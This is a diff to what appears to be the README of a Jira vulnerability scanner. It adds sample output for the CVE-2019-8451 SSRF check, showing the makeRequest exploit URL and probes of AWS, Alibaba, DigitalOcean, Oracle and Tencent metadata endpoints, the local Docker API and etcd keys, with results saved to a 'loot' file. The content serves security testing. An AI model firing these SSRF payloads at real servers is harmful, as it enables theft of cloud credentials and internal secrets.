@@ -141,3 +141,38 @@ ex: CVE-2019-8442
 + CVE-2019-8442 Detected: Information Disclosure vulnerability found!
   URL: https://jira3/jira/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
 ```
+
+ex: CVE-2019-8451
+```
+INFO: IN DEVELOPMENT Checking for CVE-2019-8451 (SSRF)
+[Testing URL]: http://JIRASERVER:8080/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@example.com
+[!!] [SSRF] Vulnerable to CVE-2019-8451 (SSRF): http://JIRASERVER/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@example.com
+	Checking AWS Metadata
+	----> AWS Metadata Not Found HTTP:500 
+	----> HTTP Code: 200
+throw 1; < don't be evil' >{"http://JIRASERVER:8080@169.254.169.254/latest/meta-data/":{"rc":500,"headers":{},"body":""}}
+	Checking Alibaba Metadata
+	----> Alibaba Metadata FOUND: http://JIRASERVER:8080/plugins/servlet/gadgets/makeRequest?url=http://JIRASERVER:8080@100.100.100.200/latest/meta-data/
+	Checking Docker Containers
+	----> Docker Containers Not Found HTTP:500 
+	----> HTTP Code: 200
+throw 1; < don't be evil' >{"http://JIRASERVER:8080@127.0.0.1:2375/v1.24/containers/json":{"rc":500,"headers":{},"body":""}}
+	Checking Kubernetes ETCD API keys
+	----> Kubernetes ETCD API keys Not Found HTTP:500 
+	----> HTTP Code: 200
+throw 1; < don't be evil' >{"http://JIRASERVER:8080@127.0.0.1:2379/v2/keys/?recursive=true":{"rc":500,"headers":{},"body":""}}
+	Checking Digital Ocean Metadata
+	----> Digital Ocean Metadata Not Found HTTP:500 
+	----> HTTP Code: 200
+throw 1; < don't be evil' >{"http://JIRASERVER:8080@169.254.169.254/metadata/v1.json":{"rc":500,"headers":{},"body":""}}
+	Checking Oracle Cloud
+	----> Oracle Cloud Not Found HTTP:500 
+	----> HTTP Code: 200
+throw 1; < don't be evil' >{"http://JIRASERVER:8080@192.0.0.192/latest/user-data/":{"rc":500,"headers":{},"body":""}}
+	Checking Tencent Cloud
+	----> Tencent Cloud Not Found HTTP:500 
+	----> HTTP Code: 200
+throw 1; < don't be evil' >{"http://JIRASERVER:8080@metadata.tencentyun.com/latest/meta-data/":{"rc":500,"headers":{},"body":""}}
+
+Exfiltrated data written to: loot/CVE-2019-8451_JIRASERVER:8080.txt
+```
